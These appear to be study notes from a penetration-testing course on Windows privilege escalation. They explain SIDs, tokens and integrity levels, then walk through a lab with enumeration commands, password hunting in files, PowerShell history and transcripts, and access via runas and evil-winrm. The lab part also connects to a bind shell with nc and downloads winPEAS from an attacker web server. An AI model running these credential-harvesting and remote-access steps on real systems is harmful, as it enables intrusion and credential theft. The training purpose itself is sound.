### Understanding Windows Privileges and Access Control Mechanisms

**Security Identifier (SID)** - Unique value assigned to users and groups (ex: SRXY)
	- S: literally an "S"
	- R: Revision, set to "1"
	- X: Identifier authority (ex: "5" for NT Authority)
	- Y: Identifier of sub authority. Consists of domain identifier an relative identifier (RID)
Example SID:
````
S-1-5-21-1336799502-1441772794-948155058-1001
````
RID=1001 (RID starts at 1000)

List of well known SIDs on local machines

```
S-1-0-0                       Nobody        
S-1-1-0	                      Everybody
S-1-5-11                      Authenticated Users
S-1-5-18                      Local System
S-1-5-domainidentifier-500    Administrator
```

**Access token** - Assigned once user has authenticated. This token describes security context of the user (SIDs, privileges, etc.). 
	- Primary token: duplicate of user's access token assigned to processes/threads created by the user
	- Impersonation token: ability of a thread to execute in a security context different from the process that owns the thread

**Mandatory Integrity Control** - Access control using _integrity levels_

_Integrity Levels_
```
- System: SYSTEM (kernel, ...)
- High: Elevated users
- Medium: Standard users
- Low: Very restricted rights often used in sandboxed[^privesc_win_sandbox] processes or for directories storing temporary data
- Untrusted: Lowest integrity level with extremely limited access rights for processes or objects that pose the most potential risk
```
Admin vs User PowerShell processes

**User Account Control** (UAC)-  Runs most applications with user privileges. Admins will have a user and an admin token.

### Situational Awareness/Enumeration

Information we should gather to determine privilege escalation vectors


- Username and hostname
	- `whoami`
- Group memberships of the current user
	- `whoami /groups`
- Existing users and groups
	- `net user` 
	- `Get-LocalUser`
	- `net localgroup`
	- `Get-LocalGroup`
	- `Get-LocalGroupMember <group name>`
- Operating system, version and architecture
	- `systeminfo`
- Network information
	- `ipconfig /all`
	- `route print`
	- `netstat -ano`
- Installed applications
	- `Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname`
	- `Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname`
	- Review `Program Files` and `Downloads` directories
- Running processes
	- `Get-Process`


Key notes:
- Backup groups and users often have extensive permissions
- Built in groups include _Administrators_, _Backup Operators_, _Remote Desktop Users_, and _Remote Management Users_(can access with winrm)
- Enumerate network connections to determine more machines/services or even other users connected
- Search for applications installed to locate a public exploit 

### Hidden in Plain View 

Sensitive info, such as passwords can be stored in meeting notes, config files, onboarding docs

If a password manager (like KeePass) is installed... search for these databases:

`
`

If XAMPP is installed..search for config files with applicable file extensions 

`Get-ChildItem -Path C:\xampp -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue`

Discovering two files...

`type C:\xampp\passwords.txt`

Result: only default passwords

```
### XAMPP Default Passwords ###

1) MySQL (phpMyAdmin):

   User: root
   Password:
   (means no password!)
...
   Postmaster: Postmaster (postmaster@localhost)
   Administrator: Admin (admin@localhost)

   User: newuser  
   Password: wampp 
...
```

and `type C:\xampp\mysql\bin\my.ini`

Resulted in permissions error

Searching for text files and password manager databases in the home directory of dave (or other target user)

`Get-ChildItem -Path C:\Users\dave\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue`

Discover a txt file that reveal a new user and his password.

Check what groups new user steve is in

`net user steve`

He is a remote desktop user. 

RDP in as steve and begin enumeration again from the top!

Attempting to view previously inaccessible config file again:

`type C:\xampp\mysql\bin\my.ini`

Discover the user backupadmin's password. 

Review groups' that backupadmin is a member of to see if we can connect with WinRM or RDP

`net user backupadmin`

He is not a member of _Remote Desktop Users_ or _Remote Management Users_ :(

Need to find another way to access the system or execute commands with these creds.

Common priv esc methods:
- RDP or WinRM
- If user has _Log on as a batch job_[6](https://portal.offsec.com/courses/pen-200-44065/learning/windows-privilege-escalation-45276/enumerating-windows-185054/hidden-in-plain-view-45280#fn-local_id_193-6) access right, schedule a task to execute a program as this user
- If target user has active session, use PsExec
- If we have access to GUI, use Runas in PowerShell

Using Runas to execute cmd as user backupadmin

`runas /user:backupadmin cmd`

###  Information Goldmine PowerShell

PowerShell logging mechanisms
1. _PowerShell Transcription_ - logs everything from powershell and stores in _transcript_ files in user's home directories, a central directory for all users, or a network share 
2. _PowerShell Script Block Logging_ - records commands and blocks of code

##### Demonstration - Retrieving info from PS loggers and PS history

Check PowerShell history of a user

`Get-History`

No results. 

Checking PSReadline history..

1. Display path of the history file from PSReadline
	`(Get-PSReadlineOption).HistorySavePath`
2. Display contents of the file 
	`type C:\Users\dave\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt`

Get password creds and valuable info from this.

```
$PSVersionTable
Register-SecretVault -Name pwmanager -ModuleName SecretManagement.keepass -VaultParameters $VaultParams
Set-Secret -Name "Server02 Admin PW" -Secret "paperEarMonitor33@" -Vault pwmanager
cd C:\
ls
cd C:\xampp
ls
type passwords.txt
Clear-History
Start-Transcript -Path "C:\Users\Public\Transcripts\transcript01.txt"
Enter-PSSession -ComputerName CLIENTWK220 -Credential $cred
exit
Stop-Transcript
```

Curious what the credentials used in $cred for the PSSession are.

Analyzing transcript file 

`type C:\Users\Public\Transcripts\transcript01.txt`

This file does contain the info used to create the $cred file

```hlt:3,4,5
**********************
Transcript started, output file is C:\Users\Public\Transcripts\transcript01.txt
PS C:\Users\dave> $password = ConvertTo-SecureString "qwertqwertqwert123!!" -AsPlainText -Force
PS C:\Users\dave> $cred = New-Object System.Management.Automation.PSCredential("daveadmin", $password)
PS C:\Users\dave> Enter-PSSession -ComputerName CLIENTWK220 -Credential $cred
```

Copying three highlighted commands and using them in our initial access bind shell to get a PS session as daveadmin

`$password = ConvertTo-SecureString "qwertqwertqwert123!!" -AsPlainText -Force`

`$cred = New-Object System.Management.Automation.PSCredential("daveadmin", $password)`

`Enter-PSSession -ComputerName CLIENTWK220 -Credential $cred`

Note: Creating a PowerShell remoting session via WinRM in a bind shell can cause unexpected behavior. 

Use #evilwinrm to connect using dave's creds 

`evil-winrm -i 192.168.50.220 -u daveadmin -p "qwertqwertqwert123\!\!"`

### Automated Enumeration

Tools:
[[WinPEAS]]
[[Seatbelt]]
[[JAWS]]

Copy WinPEAS to our home directory and start Python3 web server

`cp /usr/share/peass/winpeas/winPEASx64.exe .`

`python3 -m http.server 80`

Connect to the bind shell 

`nc 192.168.50.220 4444`

Transfer the WinPEAS binary to CLIENTWK220 using powershell

`iwr -uri http://192.168.48.3/winPEASx64.exe -Outfile winPEAS.exe`

Execute #winPEAS `.\winPEAS.exe`

Output legend of winPEAS

```
+] Legend:
         Red                Indicates a special privilege over an object or something is misconfigured
         Green              Indicates that some protection is enabled or something is well configured
         Cyan               Indicates active users
         Blue               Indicates disabled users
         LightYellow        Indicates links
```

Reviewing winPEAS output:

 Basic System Information of winPEAS

Tool incorrectly identified target OS and missed the meeting note, transcript file, and PowerShell history.

Actually got some juicy powershell history

![[Pasted image 20250411125409.png]]

```
PS C:\xampp> (Get-PSReadlineOption).HistorySavePath 
C:\Users\adrian\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
PS C:\xampp> type C:\Users\adrian\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
ipconfig
hostname
echo "Let's check if this script works running as damon and password i6yuT6tym@"
echo "Don't forget to clear history once done to remove the password!"
Enter-PSSession -ComputerName LEGACY -Credential $credshutdown /s
```

Looks like we can switch to the `damon` user with the password `i6yuT6tym@`
